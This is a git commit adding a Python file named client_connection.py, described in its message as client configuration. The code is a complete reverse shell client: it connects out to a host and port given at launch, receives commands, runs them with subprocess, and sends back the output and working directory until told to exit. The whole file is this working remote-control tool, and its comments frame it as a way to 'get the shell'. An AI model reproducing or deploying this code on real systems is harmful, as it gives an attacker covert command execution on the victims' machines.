7b83ce0ccf4f6ca7d52ae578e34be8e54c9ba51c
NavinSha1801 <navin18sharma01@gmail.com>
2023-08-31 13:05:52 +0530

    Added 2 Files
    In this commit there lies 2 files one for server Configration and
    another for client configration

---
+++ client_connection.py
@@ -0,0 +1,44 @@
+#Local Imports
+import socket,os,subprocess,sys
+
+#Server Configration
+SERVER_HOST = sys.argv[1] #We have to configure IP for the server or the server Public IP Address
+SERVER_PORT = 5003 #Port wherever we have to get the shell
+BUFFER_SIZE = 1024 * 1024 # 128KB max size of messages, feel free to increase
+# separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
+
+# create the socket object
+s = socket.socket()
+# connect to the server
+s.connect((SERVER_HOST, SERVER_PORT))
+# get the current directory
+cwd = os.getcwd()
+s.send(cwd.encode())
+while True:
+    # receive the command from the server
+    command = s.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    if splited_command[0].lower() == "cd":
+        # cd command, change directory
+        try:
+            os.chdir(' '.join(splited_command[1:]))
+        except FileNotFoundError as e:
+            # if there is an error, set as the output
+            output = str(e)
+        else:
+            # if operation is successful, empty message
+            output = ""
+    else:
+        # execute the command and retrieve the results
+        output = subprocess.getoutput(command)
+    # get the current working directory as output
+    cwd = os.getcwd()
+    # send the results back to the server
+    message = f"{output}{SEPARATOR}{cwd}"
+    s.send(message.encode())
+# close client connection
+s.close()
